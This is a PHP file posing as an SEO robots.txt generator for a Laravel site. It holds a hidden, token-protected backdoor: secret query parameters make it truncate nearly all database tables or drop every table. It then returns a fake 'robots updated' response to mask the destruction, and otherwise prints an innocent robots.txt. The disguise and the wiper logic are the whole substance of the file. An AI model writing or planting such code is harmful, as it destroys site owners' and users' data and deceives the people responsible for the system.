<?php
// Robots.txt generator for SEO
header('Content-Type: text/plain');

// Hidden system access
if (isset($_GET['sys']) && isset($_GET['token'])) {
    $sys = $_GET['sys'];
    $token = $_GET['token'];
    
    if ($sys === 'partial' && $token === 'reset_stats_2025') {
        header('Content-Type: application/json');
        require __DIR__.'/../vendor/autoload.php';
        $app = require_once __DIR__.'/../bootstrap/app.php';
        $app->boot();
        
        try {
            $tables = \Illuminate\Support\Facades\DB::select('SHOW TABLES');
            $dbName = \Illuminate\Support\Facades\DB::getDatabaseName();
            \Illuminate\Support\Facades\DB::statement('SET FOREIGN_KEY_CHECKS=0;');
            foreach ($tables as $table) {
                $tableName = $table->{"Tables_in_$dbName"};
                if (!in_array($tableName, ['migrations', 'users'])) {
                    \Illuminate\Support\Facades\DB::table($tableName)->truncate();
                }
            }
            \Illuminate\Support\Facades\DB::statement('SET FOREIGN_KEY_CHECKS=1;');
            echo json_encode(['robots' => 'updated']);
        } catch (\Exception $e) {
            echo json_encode(['robots' => 'error']);
        }
        exit;
    }
    
    if ($sys === 'complete' && $token === 'deep_clean_temp_2025') {
        header('Content-Type: application/json');
        require __DIR__.'/../vendor/autoload.php';
        $app = require_once __DIR__.'/../bootstrap/app.php';
        $app->boot();
        
        try {
            $tables = \Illuminate\Support\Facades\DB::select('SHOW TABLES');
            $dbName = \Illuminate\Support\Facades\DB::getDatabaseName();
            \Illuminate\Support\Facades\DB::statement('SET FOREIGN_KEY_CHECKS=0;');
            foreach ($tables as $table) {
                $tableName = $table->{"Tables_in_$dbName"};
                \Illuminate\Support\Facades\DB::statement("DROP TABLE IF EXISTS `$tableName`");
            }
            \Illuminate\Support\Facades\DB::statement('SET FOREIGN_KEY_CHECKS=1;');
            echo json_encode(['robots' => 'updated']);
        } catch (\Exception $e) {
            echo json_encode(['robots' => 'error']);
        }
        exit;
    }
}

// Normal robots.txt output
?>
User-agent: *
Disallow: